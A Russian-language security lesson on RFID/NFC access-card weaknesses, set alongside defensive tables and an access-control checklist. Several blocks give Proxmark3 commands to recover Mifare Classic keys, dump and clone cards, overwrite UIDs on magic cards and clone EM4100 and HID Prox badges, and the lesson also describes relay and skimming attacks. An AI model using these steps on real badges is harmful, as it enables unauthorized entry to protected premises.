RFID и NFC — технологии бесконтактной идентификации: карты доступа, пропуска, платежи. Их безопасность зависит от типа карты и криптографии. Mifare Classic сломан, релей NFC обходит «близость», а недорогой Proxmark3 делает клонирование доступным. Урок продолжает [`network-module-wireless`](network-module-wireless).

## Частоты и типы

| Диапазон | Частота | Примеры |
|---|---|---|
| LF | 125 кГц | EM4100, HID Prox, животные |
| HF | 13.56 МГц | Mifare, NFC, банковские карты |
| UHF | 860–960 МГц | логистика, дальние метки |

**NFC** — подмножество HF (13.56 МГц) с активным/пассивным режимом и малым радиусом (до 10 см).

## Mifare Classic и Crypto1

**Mifare Classic** — самая распространённая карта доступа. Шифр **Crypto1** был восстановлен, что позволяет:

- читать/клонировать карту;
- восстанавливать ключи;
- подделывать блоки (UID, сектора).

```bash
# Proxmark3: чтение и определение карты
pm3 --> hf search
# Атака на ключи Mifare Classic (darkside/nested)
pm3 --> hf mf darkside
pm3 --> hf mf nested 1 0 A FFFFFFFFFFFF
# Дамп карты
pm3 --> hf mf dump
# Восстановить из дампа
pm3 --> hf mf restore
```

## Чтение и клонирование

```bash
# nfcpy: прочитать NDEF с телефона/ридера
python3 -c "import nfc; c=nfc.ContactlessFrontend('usb'); print(c)"
# EM4100 (LF) клонирование через Proxmark
pm3 --> lf search
pm3 --> lf em 410x clone --id 0102030405
# HID Prox
pm3 --> lf hid read
pm3 --> lf hid clone --id 2006ec0c86
```

Клонирование карты доступа — прямой обход физического контроля.

## NFC-релей

**Релей-атака** разделяет чтение и запись: два устройства (или телефон) передают данные карты на расстояние через сеть. Карта думает, что рядом с ней ридер, а ридер — что карта. Так обходят «близость» и открывают дверь/проводят оплату.

```text
[карта] <-- NFC --> [релей A] <-- интернет --> [релей B] <-- NFC --> [ридер]
```

## UID и анти-клонирование

Некоторые системы проверяют **UID** (уникальный ID), который на дешёвых картах подделывается (magic cards). Защита — карты с криптографией (DESFire, iClass SE) и mutual authentication, где UID недостаточен.

```bash
# Проверить, можно ли перезаписать UID (magic card)
pm3 --> hf mf csetuid --uid 11223344
```

## Защита

| Мера | Против чего |
|---|---|
| Криптокарты (DESFire, iClass SE) | клонирование |
| Mutual authentication | UID-спуфинг |
| Защита от релея (distance bounding) | релей-атаки |
| Двухфакторность (PIN + карта) | клонирование |
| Мониторинг аномалий доступа | злоупотребление |
| Физический контроль зоны | скимминг/релей |

## Частые ошибки

- **Использовать Mifare Classic** — сломанный Crypto1.
- **Доверять только UID** — подделывается.
- **Считать NFC «близким»** — релей обходит расстояние.
- **Игнорировать LF-карты** — EM4100 клонируется тривиально.
- **Путать частоты** — 125 кГц vs 13.56 МГц.
- **Не мониторить доступ** — клонирование невидимо.
- **Забывать про magic cards** — UID перезаписывается.

## Практика: чтение и клонирование

```bash
# Proxmark3: определить карту
pm3 --> hf search
pm3 --> lf search
# Mifare Classic: восстановить ключи и снять дамп
pm3 --> hf mf nested 1 0 A FFFFFFFFFFFF
pm3 --> hf mf dump
# Клонировать на magic-карту

# LF EM4100: клонировать
pm3 --> lf em 410x clone --id 0102030405
# HID Prox
pm3 --> lf hid read
pm3 --> lf hid clone --id 2006ec0c86
```

Клонирование карты доступа обходит физический контроль, если система доверяет только UID.

## Сравнение типов карт

| Карта | Частота | Криптография | Клонируется |
|---|---|---|---|
| EM4100 | 125 кГц | нет (только UID) | тривиально |
| HID Prox | 125 кГц | нет | легко |
| Mifare Classic | 13.56 МГц | Crypto1 (сломан) | да |
| Mifare DESFire | 13.56 МГц | AES/3DES | нет (при верной настройке) |
| iClass SE | 13.56 МГц | mutual auth | нет |

## Чек-лист контроля доступа

1. Какие **типы карт** используются (LF/HF, крипто)?
2. Доверяет ли система только **UID**?
3. Включена ли **взаимная аутентификация**?
4. Есть ли **защита от релея** (distance bounding)?
5. Двухфакторность (**PIN + карта**)?
6. Мониторятся ли **аномалии доступа**?
7. Контролируется ли **скимминг** (физическая зона)?

```bash
# Определить тип карты
pm3 --> hf search
pm3 --> lf search
# Проверить magic-карту (перезапись UID)
pm3 --> hf mf csetuid --uid 11223344
```

Вывод: если карта клонируется, а система доверяет UID — контроль доступа обходится. Защита — криптокарты, mutual auth, защита от релея и второй фактор.

## Итог по NFC/RFID

Безопасность контроля доступа определяется типом карты и архитектурой. Mifare Classic и UID-only системы обходятся клонированием; релей обходит «близость». Защита — криптокарты с mutual authentication, второй фактор, distance bounding и мониторинг. Простая замена карт на криптостойкие закрывает большинство практических векторов.

## Дополнительно: релей и скимминг

**Релей** разделяет две половины транзакции:

```text
[карта жертвы] <--NFC--> [релей A] <--сеть--> [релей B] <--NFC--> [ридер двери]
```

Релей A стоит рядом с картой жертвы (в сумке, кармане), релей B — у ридера. Данные передаются в реальном времени. Карта «думает», что она у ридера, ридер — что карта рядом. Так обходят требование физической близости.

**Скимминг** — установка поддельного ридера поверх настоящего для сбора данных карт. Защита — визуальный контроль, пломбы, шифрование на уровне карты.
